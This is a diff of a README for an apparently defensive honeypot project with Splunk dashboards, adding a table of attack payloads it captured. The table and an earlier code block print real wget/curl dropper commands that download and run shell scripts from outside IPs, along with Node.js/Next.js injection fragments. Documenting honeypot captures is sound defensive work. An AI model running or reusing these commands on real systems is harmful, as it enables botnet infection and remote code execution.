@@ -183,8 +183,9 @@ tail -f logs/honeypot.json
 
 
 ## How to verify in Splunk
+Create a new dashboard from source code as described in this repository.
 
-After running these, refresh your dashboard. You should see:
+After running the above attacks, refresh your dashboard. You should see:
 
 1. **Critical Alerts:** Count should increase.
 2. **Attack Volume:** New bars appearing in the chart.
@@ -195,9 +196,6 @@ If you expose to the internet with e.g. port forwading in your home router, you 
 ```
 45.38.44.221  wget 41.216.189.156/1.sh; curl -O 41.216.189.156/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh
 193.142.146.230  wget 109.111.55.221/ok; curl -O 109.111.55.221/ok; chmod 777 ok; sh ok; rm -rf ok; rm -rf ok.*
-45.38.44.221   wget 41.216.189.156/1.sh; curl -O 41.216.189.156/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh
-193.142.146.230  cd /tmp; wget 109.111.55.221/ok; curl -O 109.111.55.221/ok; chmod 777 ok; sh ok; rm -rf ok; rm -rf ok.*
-
 ```
 ![splunk_honeypot_19Dec2025_1.png](/splunk_honeypot_19Dec2025_1.png)
 ![splunk_honeypot_19Dec2025_2.png](/splunk_honeypot_19Dec2025_2.png)
@@ -205,5 +203,16 @@ If you expose to the internet with e.g. port forwading in your home router, you 
 
 
 
-## 📊 Splunk
-Create a new dashboard from source code as described in this repository.
+### 🚨 Captured Attack Payloads
+The following real-world attacks were captured by the honeypot. These logs demonstrate active exploitation attempts, ranging from simple botnet downloaders to complex Node.js injections.
+
+| Attacker IP | Command | Payload / Signature | Attack Type |
+| :--- | :--- | :--- | :--- |
+| **45.38.44.221** | `wget` | `0:00&mac=;wget 41.216.189.156/1.sh; curl -O 41.216.189.156/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh` | **Mirai/Gafgyt Botnet**<br>Standard shell downloader script. |
+| **193.142.146.230** | `wget` | `cd /tmp; wget 109.111.55.221/ok; curl -O 109.111.55.221/ok; chmod 777 ok; sh ok; rm -rf ok` | **Botnet Dropper**<br>Tries to download and execute a binary named `ok`. |
+| **79.124.40.174** | `sh` | `EDIRECT;push;/login?a=${res};307;`});", "_chunks": "$Q2", "_formData": { "get": "$1:constructor:co` | **Next.js / Node.js Injection**<br>Attempting to exploit prototype pollution or server-side template injection. |
+| **87.121.84.154** | `sh` | `).on('finish',()=>process.mainModule.require('fs').chmodSync('/dev/shm/lrt',0o755))));` | **Node.js RCE**<br>Tries to write a malicious file (`lrt`) to shared memory (`/dev/shm`) and execute it. |
+| **5.187.35.21** | `sh` | `EDIRECT;push;/login?a=' res ';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}` | **React/Next.js Exploit**<br>Targeting the specific vulnerability this honeypot emulates. |
+| **172.104.241.92** | `ID` | `<operationID>00000001-00000001</operationID> ... <RetrieveServiceContent xmlns="urn:internal` | **VMWare vCenter Exploit**<br>Likely scanning for CVE-2021-21972 (SOAP/XML injection). |
+| **45.194.92.18** | `id` | `c":"2.0","id":"0","method":"auth_login","params":{"credit":"oUE_5oUE_5"}}]` | **JSON-RPC Attack**<br>Likely targeting exposed APIs or IoT devices using JSON-RPC. |
+| **103.77.241.135** | `id` | `country=$(id>cd /tmp || cd /var/run ... wget hxxp://103.77.241.135/1.sh` | **Shell Injection**<br>Classic command injection attempting to download a shell script. |
